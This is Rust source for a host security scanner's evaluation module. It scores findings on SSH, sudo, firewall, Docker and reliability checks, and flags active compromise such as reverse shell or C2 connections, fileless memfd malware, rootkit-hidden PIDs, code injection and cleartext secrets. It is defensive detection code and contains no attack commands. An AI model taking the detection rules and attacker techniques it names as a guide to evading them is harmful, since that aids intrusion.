use crate::models::{AgentReport, CronSeverity, InjectionClass, Origin};

// ── Legacy constants (kept for backward compatibility) ─────

pub const RISK_NO_FIREWALL: u8 = 30;
pub const RISK_SSH_ROOT_LOGIN: u8 = 25;
pub const RISK_SECURITY_UPDATES: u8 = 20;
pub const RISK_CRITICAL_SSL_MAX: u8 = 15;
pub const RISK_FAILED_SERVICES: u8 = 10;
pub const RISK_SSH_PASSWORD_AUTH: u8 = 10;
pub const RISK_OOM_KILLS: u8 = 10;
pub const RISK_NO_BACKUP: u8 = 20;
pub const RISK_NTP_NOT_SYNCED: u8 = 10;
pub const RISK_SUDOERS_MODE: u8 = 5;
pub const RISK_SYSCTL_PER_ISSUE: u8 = 5;

pub const SYSCTL_CRITICAL_THRESHOLD: usize = 3;

// ── Docker reliability constants (v0.5.x) ─────────────────
pub const RISK_CONTAINER_OOM: u8 = 10;
pub const RISK_CONTAINER_RESTART_LOOP: u8 = 5;
pub const RISK_CONTAINER_UNHEALTHY: u8 = 10;
pub const RESTART_LOOP_THRESHOLD: u64 = 3;

pub const SCORING_VERSION: u8 = 7;

// ── New Finding model (v0.5) ───────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Category {
    Security,
    Reliability,
    Hygiene,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct Finding {
    pub id: &'static str,
    pub title: String,
    pub category: Category,
    pub weight: u8,
    pub evidence: String,
    pub suppressed: Option<String>,
    pub cis_ref: Option<&'static str>,
}

/// Evaluate a full agent report into a list of findings.
/// This is a pure function – no side effects.
pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
    let mut findings = Vec::new();

    // ── Security ────────────────────────────────────────

    if !report.network.firewall_active {
        findings.push(Finding {
            id: "SEC-001",
            title: "Firewall inactive".to_string(),
            category: Category::Security,
            weight: RISK_NO_FIREWALL,
            evidence: "No active firewall (ufw/firewalld/nftables/iptables)".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 3.5.1.1"),
        });
    }

    // SSH root login – differentiate prohibit-password
    if report.security.ssh_root_login_enabled {
        let detail = report
            .security
            .ssh_permit_root_login_detail
            .as_deref()
            .unwrap_or("");
        let weight = if detail.eq_ignore_ascii_case("prohibit-password") {
            RISK_SSH_ROOT_LOGIN / 2 // ~12
        } else {
            RISK_SSH_ROOT_LOGIN // 25
        };
        findings.push(Finding {
            id: "SEC-002",
            title: "SSH root login allowed".to_string(),
            category: Category::Security,
            weight,
            evidence: format!("PermitRootLogin {}", detail),
            suppressed: None,
            cis_ref: Some("CIS 5.2.10"),
        });
    }

    // Security updates – stepped weights
    if report.packages.upgradable.iter().any(|p| p.is_security) {
        let count = report
            .packages
            .upgradable
            .iter()
            .filter(|p| p.is_security)
            .count();
        let weight = if count > 20 {
            RISK_SECURITY_UPDATES // 20
        } else if count > 5 {
            15
        } else {
            10
        };
        findings.push(Finding {
            id: "SEC-003",
            title: "Pending security updates".to_string(),
            category: Category::Security,
            weight,
            evidence: format!("{} security update(s) available", count),
            suppressed: None,
            cis_ref: Some("CIS 1.9"),
        });
    }

    if report
        .network
        .ssl_certificates
        .iter()
        .any(|c| c.is_critical)
    {
        findings.push(Finding {
            id: "SEC-004",
            title: "SSL certificate expiring".to_string(),
            category: Category::Security,
            weight: RISK_CRITICAL_SSL_MAX,
            evidence: "One or more SSL certificates expire within 7 days".to_string(),
            suppressed: None,
            cis_ref: None,
        });
    }

    // Sudo NOPASSWD – distinguish ALL vs restricted
    if !report.security.sudo_nopasswd_entries.is_empty() {
        let has_all = report.security.sudo_nopasswd_entries.iter().any(|entry| {
            let lower = entry.to_lowercase();
            lower.contains("nopasswd: all") || lower.ends_with("nopasswd:all")
        });
        let weight = if has_all { 15 } else { 5 };
        findings.push(Finding {
            id: "SEC-005",
            title: "Sudo NOPASSWD entries found".to_string(),
            category: Category::Security,
            weight,
            evidence: format!(
                "{} NOPASSWD entries in sudoers",
                report.security.sudo_nopasswd_entries.len()
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.4.2"),
        });
    }

    if let Some(mode) = report.security.sudoers_mode
        && mode != 0o440
    {
        findings.push(Finding {
            id: "SEC-006",
            title: "Sudoers permissions not 0440".to_string(),
            category: Category::Security,
            weight: RISK_SUDOERS_MODE,
            evidence: format!("sudoers mode is {:o}", mode),
            suppressed: None,
            cis_ref: Some("CIS 1.8.2"),
        });
    }

    // Sysctl issues – handle ip_forward with context
    for issue in &report.security.sysctl_issues {
        if issue.starts_with("net.ipv4.ip_forward=") {
            let suppressed = if report.topology.docker_active
                || report.host.native_services.iter().any(|s| s == "kubelet")
            {
                Some("expected on Docker/kubelet host".to_string())
            } else {
                None
            };
            findings.push(Finding {
                id: "SEC-007",
                title: "IP forwarding enabled".to_string(),
                category: Category::Security,
                weight: RISK_SYSCTL_PER_ISSUE,
                evidence: issue.clone(),
                suppressed,
                cis_ref: Some("CIS 3.3.1"),
            });
        } else {
            let title = issue
                .split('=')
                .next()
                .unwrap_or("sysctl issue")
                .to_string();
            let cis = match title.as_str() {
                "kernel.randomize_va_space" => Some("CIS 1.6.2"),
                "net.ipv4.tcp_syncookies" => Some("CIS 3.3.8"),
                "kernel.dmesg_restrict" => Some("CIS 1.6.2"),
                "net.ipv4.conf.all.accept_redirects" => Some("CIS 3.3.2"),
                _ => None,
            };
            findings.push(Finding {
                id: "SEC-007",
                title,
                category: Category::Security,
                weight: RISK_SYSCTL_PER_ISSUE,
                evidence: issue.clone(),
                suppressed: None,
                cis_ref: cis,
            });
        }
    }

    // SSH password authentication
    if report.security.ssh_password_auth_enabled {
        findings.push(Finding {
            id: "SEC-008",
            title: "SSH password authentication enabled".to_string(),
            category: Category::Security,
            weight: RISK_SSH_PASSWORD_AUTH,
            evidence: "PasswordAuthentication yes".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.4"),
        });
    }

    // Combo penalty: root login + password auth
    if report.security.ssh_password_auth_enabled && report.security.ssh_root_login_enabled {
        findings.push(Finding {
            id: "SEC-009",
            title: "Root login with password allowed".to_string(),
            category: Category::Security,
            weight: 5,
            evidence: "PermitRootLogin enabled AND PasswordAuthentication yes".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.10/5.2.4"),
        });
    }

    // ── IAM & Access Alignment ───────────────────────────────
    let noncompliant_keys = report
        .security
        .access_alignment
        .keys
        .iter()
        .filter(|k| !k.compliant)
        .count();
    if noncompliant_keys > 0 {
        findings.push(Finding {
            id: "SEC-011",
            title: "SSH keys violate key-strength policy".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: format!(
                "{noncompliant_keys} authorized key(s) below policy (e.g. RSA<3072, DSA, ECDSA)"
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.2"),
        });
    }

    if !report
        .security
        .access_alignment
        .sudoers_nopasswd_all
        .is_empty()
    {
        findings.push(Finding {
            id: "SEC-012",
            title: "Passwordless sudo to ALL commands".to_string(),
            category: Category::Security,
            weight: 15,
            evidence: format!(
                "{} principal(s) with NOPASSWD: ALL",
                report.security.access_alignment.sudoers_nopasswd_all.len()
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.3"),
        });
    }

    // ── Shadow IT & Suspicious Listeners ───────────────────────────────
    let mut shadow_it_ports = Vec::new();
    for port in &report.network.listening_ports {
        if let Some(exe) = &port.exe_path
            && crate::utils::is_ephemeral_exec_path(exe)
        {
            shadow_it_ports.push(format!("{}/{} ({})", port.port, port.protocol, exe));
        }
    }

    if !shadow_it_ports.is_empty() {
        findings.push(Finding {
            id: "SEC-013",
            title: "Suspicious process listening on network port (Shadow IT)".to_string(),
            category: Category::Security,
            weight: 20,
            evidence: format!(
                "Found {} suspicious listeners: {}",
                shadow_it_ports.len(),
                shadow_it_ports.join(", ")
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-015 — IoC: privileged non-root implant reachable on the network ──
    {
        let mut ioc_evidence: Vec<String> = Vec::new();
        for port in &report.network.listening_ports {
            if !crate::utils::is_wildcard_bind(&port.bind_address) {
                continue;
            }
            let Some(exe) = port.exe_path.as_deref() else {
                continue;
            };
            if !crate::utils::is_ephemeral_exec_path(exe) {
                continue;
            }
            let Some(pid) = port.pid else {
                continue;
            };
            let Some(cap) = report
                .security
                .capability_audit
                .iter()
                .find(|c| c.pid == pid)
            else {
                continue;
            };

            ioc_evidence.push(format!(
                "pid {} ({}) exe {} listening on {} holds [{}]",
                cap.pid,
                cap.comm,
                exe,
                port.bind_address,
                cap.critical_caps.join(", ")
            ));
        }

        if !ioc_evidence.is_empty() {
            findings.push(Finding {
                id: "SEC-015",
                title: "ACTIVE COMPROMISE: privileged non-root process on ephemeral path listening on network"
                    .to_string(),
                category: Category::Security,
                weight: 60,
                evidence: format!(
                    "{} reachable implant(s): {}",
                    ioc_evidence.len(),
                    ioc_evidence.join("; ")
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    // ── SEC-016 — known malware/miner processes (name-recognized subset) ──
    let name_hits: Vec<&crate::models::SuspiciousProcess> = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| {
            crate::utils::is_known_malware(&p.name) || crate::utils::is_ambiguous_malware(&p.name)
        })
        .collect();
    if !name_hits.is_empty() {
        let list = name_hits
            .iter()
            .map(|p| match &p.exe_path {
                Some(exe) => format!("{} (pid {}, {})", p.name, p.pid, exe),
                None => format!("{} (pid {})", p.name, p.pid),
            })
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding {
            id: "SEC-016",
            title: "ACTIVE COMPROMISE: known malicious process detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} known-bad process(es): {}", name_hits.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-017 — fileless malware executing from an ephemeral path ──
    let fileless: Vec<&crate::models::SuspiciousProcess> = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_deleted)
        .collect();
    if !fileless.is_empty() {
        let list = fileless
            .iter()
            .map(|p| match &p.exe_path {
                Some(exe) => {
                    if exe.starts_with("/memfd:") {
                        format!("{} (pid {}, executing in-memory (memfd))", p.name, p.pid)
                    } else {
                        format!("{} (pid {}, deleted from {})", p.name, p.pid, exe)
                    }
                }
                None => format!("{} (pid {}, deleted)", p.name, p.pid),
            })
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding {
            id: "SEC-017",
            title: "ACTIVE COMPROMISE: fileless malware executing from ephemeral path".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} fileless process(es): {}", fileless.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-019 — fileless implant that also holds critical kernel caps ──
    let mut fileless_priv: Vec<String> = Vec::new();
    for p in report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_deleted)
    {
        let where_ = match p.exe_path.as_deref() {
            Some(exe) if exe.starts_with("/memfd:") => "executing in-memory (memfd)".to_string(),
            Some(exe) => format!("deleted from {exe}"),
            None => "deleted".to_string(),
        };
        if p.euid == 0 {
            fileless_priv.push(format!(
                "{} (pid {}, {}) (root-run fileless implant, full kernel capabilities by default)",
                p.name, p.pid, where_
            ));
        } else if let Some(c) = report
            .security
            .capability_audit
            .iter()
            .find(|c| c.pid == p.pid && !c.critical_caps.is_empty())
        {
            fileless_priv.push(format!(
                "{} (pid {}, {}) holds [{}]",
                p.name,
                p.pid,
                where_,
                c.critical_caps.join(", ")
            ));
        }
    }

    if !fileless_priv.is_empty() {
        findings.push(Finding {
            id: "SEC-019",
            title: "ACTIVE COMPROMISE: fileless malware holds critical kernel capabilities"
                .to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} privileged fileless process(es): {}",
                fileless_priv.len(),
                fileless_priv.join("; ")
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-020 — process masquerading as a kernel thread ──
    let mimics: Vec<&crate::models::SuspiciousProcess> = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_mimic)
        .collect();
    if !mimics.is_empty() {
        let list = mimics
            .iter()
            .map(|p| match p.exe_path.as_deref() {
                Some(exe) => format!("{} (pid {}, real exe {})", p.name, p.pid, exe),
                None => format!(
                    "{} (pid {}, kernel-thread name with userspace cmdline)",
                    p.name, p.pid
                ),
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-020",
            title: "ACTIVE COMPROMISE: process masquerading as kernel thread".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} masquerading process(es): {}", mimics.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-021 – Bind-mount / overlay masking detected ──────
    if !report.security.mount_masking.is_empty() {
        let list = report
            .security
            .mount_masking
            .iter()
            .map(|m| format!("{} [{}] — {}", m.target_path, m.fstype, m.reason))
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-021",
            title: "ACTIVE COMPROMISE: Bind-mount masking detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} masking mount(s): {}",
                report.security.mount_masking.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-022 – Reverse shell / C2 connection detected ─────
    if !report.security.reverse_shells.is_empty() {
        let list = report
            .security
            .reverse_shells
            .iter()
            .map(|r| {
                let fd = match r.stdio_fd {
                    Some(0) => " (stdin)",
                    Some(1) => " (stdout)",
                    Some(2) => " (stderr)",
                    _ => "",
                };
                format!("{} (pid {}) → {}{}", r.process, r.pid, r.remote_address, fd)
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-022",
            title: "ACTIVE COMPROMISE: Reverse shell / C2 connection detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} interpreter(s) with outbound socket to a public host: {}",
                report.security.reverse_shells.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── SEC-023, SEC-026, SEC-027 & SEC-028 – Memory Forensics ──
    const DEEP_ESCALATE_MIN: u8 = 60; // UnknownPayload → Critical
    const DEEP_DEMOTE_MIN: u8 = 70; // Benign origin → Advisory

    enum MemBucket {
        Classic,
        DeepCritical,
        Anomaly,
        Advisory,
    }

    fn mem_bucket(f: &crate::models::LibraryInjectionFinding) -> MemBucket {
        if let Some(d) = &f.deep_forensics {
            match d.origin {
                // Escalate confidently: unattributed executable payload = live IoC.
                Origin::UnknownPayload if d.confidence >= DEEP_ESCALATE_MIN => {
                    return MemBucket::DeepCritical;
                }
                // Demote cautiously: ONLY high-confidence benign attribution.
                Origin::FfiClosure | Origin::GObjectCallback | Origin::RuntimeTrampoline
                    if d.confidence >= DEEP_DEMOTE_MIN =>
                {
                    return MemBucket::Advisory;
                }
                // JitCode / Inconclusive / low confidence → structure decides.
                _ => {}
            }
        }

        match f.classify() {
            InjectionClass::ClassicInjection => MemBucket::Classic,
            InjectionClass::MemoryAnomaly => MemBucket::Anomaly,
            InjectionClass::JitAdvisory => MemBucket::Advisory,
        }
    }

    let mut classic_injections = Vec::new();
    let mut deep_critical = Vec::new();
    let mut memory_anomalies = Vec::new();
    let mut jit_advisories = Vec::new();

    for finding in &report.security.library_injections {
        match mem_bucket(finding) {
            MemBucket::Classic => classic_injections.push(finding),
            MemBucket::DeepCritical => deep_critical.push(finding),
            MemBucket::Anomaly => memory_anomalies.push(finding),
            MemBucket::Advisory => jit_advisories.push(finding),
        }
    }

    // Hard IoC: real injections (LD_*, ephemeral .so, etc.) -> SEC-023
    if !classic_injections.is_empty() {
        let list = classic_injections
            .iter()
            .map(|l| {
                let del = if l.is_deleted { " (deleted)" } else { "" };
                format!(
                    "{} (pid {}): {} via {}{}",
                    l.process, l.pid, l.object_path, l.source, del
                )
            })
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-023",
            title: "ACTIVE COMPROMISE: Userspace rootkit or code injection detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} injected object(s): {}", classic_injections.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // Deep: unattributed executable payload -> SEC-028 (confirmed IoC)
    if !deep_critical.is_empty() {
        let list = deep_critical
            .iter()
            .map(|l| {
                let (ent, conf) = l
                    .deep_forensics
                    .as_ref()
                    .map_or((0.0, 0), |d| (d.entropy, d.confidence));
                format!(
                    "{} (pid {}) @ {}: unattributed RWX payload (entropy {:.1}, {}% conf)",
                    l.process,
                    l.pid,
                    l.region_addr.as_deref().unwrap_or("?"),
                    ent,
                    conf
                )
            })
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-028",
            title: "ACTIVE COMPROMISE: unattributed executable payload in memory".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} region(s): {}", deep_critical.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // Suspicious executable memory (isolated anon/rwx/stack/heap) -> SEC-026
    if !memory_anomalies.is_empty() {
        // Aggregation: Group by process to reduce visual noise
        // Also capture the first region address for forensic anchoring
        let mut by_process: std::collections::HashMap<String, (usize, Option<String>)> =
            std::collections::HashMap::new();
        for anomaly in &memory_anomalies {
            let key = format!("{} (pid {})", anomaly.process, anomaly.pid);
            let entry = by_process.entry(key).or_insert((0, None));
            entry.0 += 1;
            if entry.1.is_none() {
                entry.1 = anomaly.region_addr.clone();
            }
        }

        let list = by_process
            .into_iter()
            .map(|(proc, (count, addr))| {
                let addr_str = addr.as_deref().unwrap_or("?");
                format!("{proc} (first @ {addr_str}): {count} anomalous region(s)")
            })
            .collect::<Vec<_>>()
            .join("; ");

        let weight = if memory_anomalies
            .iter()
            .any(|l| l.source.contains("exec") || l.source.contains("rwx"))
        {
            20
        } else {
            10
        };

        findings.push(Finding {
            id: "SEC-026",
            title: "Suspicious executable memory mapping (anon/rwx/stack/heap)".to_string(),
            category: Category::Security,
            weight,
            evidence: format!(
                "{} process(es) with anomalous memory mappings: {}",
                memory_anomalies.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // JIT Advisory (W^X hardening gap / legit JIT cache) -> SEC-027 (Suppressed/Info)
    if !jit_advisories.is_empty() {
        let mut by_process = std::collections::HashMap::new();
        for adv in &jit_advisories {
            let key = format!("{} (pid {})", adv.process, adv.pid);
            *by_process.entry(key).or_insert(0usize) += 1;
        }

        let list = by_process
            .into_iter()
            .map(|(proc, count)| format!("{}: {} JIT regions", proc, count))
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-027",
            title: "Writable JIT code cache — hardening opportunity".to_string(),
            category: Category::Security,
            weight: 0, // Advisory only, no penalty
            evidence: format!(
                "{} process(es) using writable JIT arenas: {}",
                jit_advisories.len(),
                list
            ),
            suppressed: Some(
                "JIT topology verified; structural pattern matches expected runtime behavior."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    // ── SEC-024 – True Ghost PID (LKM rootkit process hiding) ─
    if !report.security.ghost_pids.is_empty() {
        let describe = |g: &crate::models::GhostPidFinding| {
            let st = g.state.as_deref().unwrap_or("?");
            let age = g
                .age_secs
                .map(|a| format!("{a}s"))
                .unwrap_or_else(|| "age?".to_string());
            let sock = if g.holds_socket { ", holds socket" } else { "" };
            format!(
                "pid {} (state {st}, {age}, via {}{sock})",
                g.pid, g.confirmed_via
            )
        };

        let (hard, soft): (Vec<_>, Vec<_>) = report
            .security
            .ghost_pids
            .iter()
            .partition(|g| g.confirmed_ioc);

        if !hard.is_empty() {
            let list = hard
                .iter()
                .map(|g| describe(g))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-024",
                title: "ACTIVE COMPROMISE: Hidden process (LKM rootkit) detected".to_string(),
                category: Category::Security,
                weight: 60,
                evidence: format!(
                    "{} PID(s) live but hidden from /proc listing: {}",
                    hard.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !soft.is_empty() {
            let list = soft
                .iter()
                .map(|g| describe(g))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-025",
                title: "Suspicious transient PID visibility mismatch".to_string(),
                category: Category::Security,
                weight: 20,
                evidence: format!(
                    "{} PID(s) with a readdir/stat mismatch, downgraded (young or unconfirmable): {}",
                    soft.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    // ── SEC-018 – Malicious cron job detected ────────────────
    if let Some(_critical) = report
        .host
        .cron_jobs
        .iter()
        .find(|c| c.severity == CronSeverity::Critical)
    {
        let critical_jobs: Vec<&str> = report
            .host
            .cron_jobs
            .iter()
            .filter(|c| c.severity == CronSeverity::Critical)
            .map(|c| c.command.as_str())
            .collect();

        findings.push(Finding {
            id: "SEC-018",
            title: "Suspicious cron job detected (possible persistence)".to_string(),
            category: Category::Security,
            weight: 20,
            evidence: format!(
                "{} suspicious cron job(s): {}",
                critical_jobs.len(),
                critical_jobs.join("; ")
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.1.8"),
        });
    }

    // ── DLP & Secret Hygiene ───────────────────────────────
    if !report.security.secret_hygiene.is_empty() {
        let mut evidence_list = Vec::new();
        for leak in report.security.secret_hygiene.iter().take(3) {
            evidence_list.push(format!(
                "'{}' in {} of {} (pid {})",
                leak.matched_key, leak.source, leak.process, leak.pid
            ));
        }
        let mut evidence_str = evidence_list.join(", ");
        if report.security.secret_hygiene.len() > 3 {
            evidence_str.push_str(&format!(
                " and {} more...",
                report.security.secret_hygiene.len() - 3
            ));
        }

        findings.push(Finding {
            id: "SEC-014",
            title: "Cleartext secrets exposed in process memory".to_string(),
            category: Category::Security,
            weight: 25,
            evidence: format!(
                "Found {} leak(s): {}",
                report.security.secret_hygiene.len(),
                evidence_str
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── Non-root processes with critical kernel capabilities ──
    if !report.security.capability_audit.is_empty() {
        let n = report.security.capability_audit.len();
        let nnp_open = report
            .security
            .capability_audit
            .iter()
            .filter(|f| f.no_new_privs == Some(false))
            .count();

        let ports = &report.network.listening_ports;
        let (listening, exposed) =
            report
                .security
                .capability_audit
                .iter()
                .fold((0usize, 0usize), |(l, e), f| {
                    let pid = Some(f.pid);
                    let mut on_net = false;
                    let mut global = false;
                    for p in ports {
                        if p.pid == pid {
                            on_net = true;
                            if crate::utils::is_wildcard_bind(&p.bind_address) {
                                global = true;
                                break;
                            }
                        }
                    }
                    (l + on_net as usize, e + global as usize)
                });

        let mut evidence = format!(
            "{n} non-root process(es) with SYS_ADMIN/SYS_PTRACE/DAC_OVERRIDE/NET_RAW or ambient capability sets"
        );
        if nnp_open > 0 {
            evidence.push_str(&format!(
                "; {nnp_open} of them with NoNewPrivs=0 — setuid execve escalation path open"
            ));
        }
        if listening > 0 {
            if exposed > 0 {
                evidence.push_str(&format!(
                    "; WARNING: {listening} of these listening on the network ({exposed} exposed globally on 0.0.0.0/::)"
                ));
            } else {
                evidence.push_str(&format!(
                    "; WARNING: {listening} of these listening on the network (none exposed globally)"
                ));
            }
        }

        let weight = if exposed > 0 { 20 } else { 8 };

        findings.push(Finding {
            id: "CAP-001",
            title: "Non-root processes hold critical kernel capabilities".to_string(),
            category: Category::Security,
            weight,
            evidence,
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── Docker container security issues ────────────────
    let mut has_mem_limit_issue = false;
    let mut has_cpu_limit_issue = false;
    let mut has_privileged = false;
    let mut has_dangerous_caps = false;

    for container in &report.topology.containers {
        let issues = container.security_issues();
        for issue in issues {
            match issue {
                "NoMemLimit" => has_mem_limit_issue = true,
                "NoCpuLimit" => has_cpu_limit_issue = true,
                "PRIVILEGED" => has_privileged = true,
                "SYS_ADMIN" | "NET_ADMIN" => has_dangerous_caps = true,
                _ => {}
            }
        }
    }

    if has_mem_limit_issue {
        findings.push(Finding {
            id: "DOCK-001",
            title: "Docker containers without memory limits".to_string(),
            category: Category::Security,
            weight: 5,
            evidence: "At least one container lacks a memory limit".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.3"),
        });
    }
    if has_cpu_limit_issue {
        findings.push(Finding {
            id: "DOCK-002",
            title: "Docker containers without CPU limits".to_string(),
            category: Category::Security,
            weight: 3,
            evidence: "At least one container lacks a CPU limit".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.2"),
        });
    }
    if has_privileged {
        findings.push(Finding {
            id: "DOCK-003",
            title: "Privileged Docker containers detected".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: "At least one container is running in privileged mode".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.4"),
        });
    }
    if has_dangerous_caps {
        findings.push(Finding {
            id: "DOCK-004",
            title: "Docker containers with dangerous capabilities".to_string(),
            category: Category::Security,
            weight: 10,
            evidence:
                "At least one container has elevated kernel capabilities (SYS_ADMIN/NET_ADMIN)"
                    .to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.5"),
        });
    }

    // ── DOCK-010 — runtime capability ground truth (container escape) ──
    let mut tampered: Vec<String> = Vec::new();
    for c in &report.topology.containers {
        if c.privileged {
            continue;
        }
        let Some(bnd) = c.runtime_bounding_caps else {
            continue;
        };
        let undeclared = crate::scanners::capabilities::undeclared_escape_caps(bnd, &c.cap_add);
        if !undeclared.is_empty() {
            tampered.push(format!(
                "{} holds undeclared [{}]",
                c.name,
                undeclared.join(", ")
            ));
        }
    }
    if !tampered.is_empty() {
        findings.push(Finding {
            id: "DOCK-010",
            title: "ACTIVE COMPROMISE: container runtime capabilities exceed declared config"
                .to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} container(s) with runtime cap tampering: {}",
                tampered.len(),
                tampered.join("; ")
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.2.5"),
        });
    }

    // ── Sensitive host mounts (Docker breakout surface) ──
    let mut has_socket_or_root = false;
    let mut has_sensitive_rw = false;

    for container in &report.topology.containers {
        for m in &container.sensitive_mounts {
            if m == "DOCKER_SOCKET" || m == "HOST_ROOT" {
                has_socket_or_root = true;
            } else if m.ends_with("(rw)") {
                has_sensitive_rw = true;
            }
        }
    }

    if has_socket_or_root {
        findings.push(Finding {
            id: "DOCK-005",
            title: "Container mounts Docker socket or host root".to_string(),
            category: Category::Security,
            weight: 15,
            evidence: "A container bind-mounts /var/run/docker.sock or / (host takeover primitive)"
                .to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.31"),
        });
    }
    if has_sensitive_rw {
        findings.push(Finding {
            id: "DOCK-006",
            title: "Container mounts sensitive host path (writable)".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: "A container has a writable bind-mount of a sensitive host directory"
                .to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.7"),
        });
    }

    // ── Docker reliability ───────────────────────────────
    let mut oom_names: Vec<&str> = Vec::new();
    let mut loop_names: Vec<&str> = Vec::new();
    let mut unhealthy_names: Vec<&str> = Vec::new();

    for c in &report.topology.containers {
        if c.oom_killed {
            oom_names.push(&c.name);
        }
        if c.restart_count >= RESTART_LOOP_THRESHOLD || c.state == "restarting" {
            loop_names.push(&c.name);
        }
        if c.health_status.as_deref() == Some("unhealthy") {
            unhealthy_names.push(&c.name);
        }
    }

    if !oom_names.is_empty() {
        oom_names.sort_unstable();
        let list = oom_names.join(", ");
        findings.push(Finding {
            id: "DOCK-007",
            title: "Docker containers killed by OOM".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_OOM,
            evidence: format!("OOMKilled: {}", list),
            suppressed: None,
            cis_ref: None,
        });
    }
    if !loop_names.is_empty() {
        loop_names.sort_unstable();
        let list = loop_names.join(", ");
        findings.push(Finding {
            id: "DOCK-008",
            title: "Docker containers in restart loop".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_RESTART_LOOP,
            evidence: format!(
                "restart_count >= {} or currently restarting: {}",
                RESTART_LOOP_THRESHOLD, list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }
    if !unhealthy_names.is_empty() {
        unhealthy_names.sort_unstable();
        let list = unhealthy_names.join(", ");
        findings.push(Finding {
            id: "DOCK-009",
            title: "Unhealthy Docker containers (failing healthcheck)".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_UNHEALTHY,
            evidence: format!("unhealthy: {}", list),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── Reliability ─────────────────────────────────────

    if report
        .host
        .failed_services
        .iter()
        .any(|s| s.contains(".service"))
    {
        findings.push(Finding {
            id: "REL-001",
            title: "Failed systemd services".to_string(),
            category: Category::Reliability,
            weight: RISK_FAILED_SERVICES,
            evidence: format!("{} failed service(s)", report.host.failed_services.len()),
            suppressed: None,
            cis_ref: None,
        });
    }

    if report.host.backup_tools.is_empty() {
        findings.push(Finding {
            id: "REL-002",
            title: "No backup tools detected".to_string(),
            category: Category::Reliability,
            weight: RISK_NO_BACKUP,
            evidence: "No automated backup tools found".to_string(),
            suppressed: None,
            cis_ref: None,
        });
    }

    if report.host.oom_kills > 0 {
        findings.push(Finding {
            id: "REL-003",
            title: "OOM kills present".to_string(),
            category: Category::Reliability,
            weight: RISK_OOM_KILLS,
            evidence: format!("{} OOM kill(s) detected", report.host.oom_kills),
            suppressed: None,
            cis_ref: None,
        });
    }

    // ── Hygiene ─────────────────────────────────────────

    if !report.host.ntp_synchronized {
        findings.push(Finding {
            id: "HYG-001",
            title: "NTP not synchronized".to_string(),
            category: Category::Hygiene,
            weight: RISK_NTP_NOT_SYNCED,
            evidence: "Time not synchronized".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 2.2.1.1"),
        });
    }

    findings
}

// ── Scoring from findings ──────────────────────────────────

#[allow(dead_code)]
pub struct ScoredReport {
    pub total: u8,
    pub security: u8,
    pub reliability: u8,
    pub hygiene: u8,
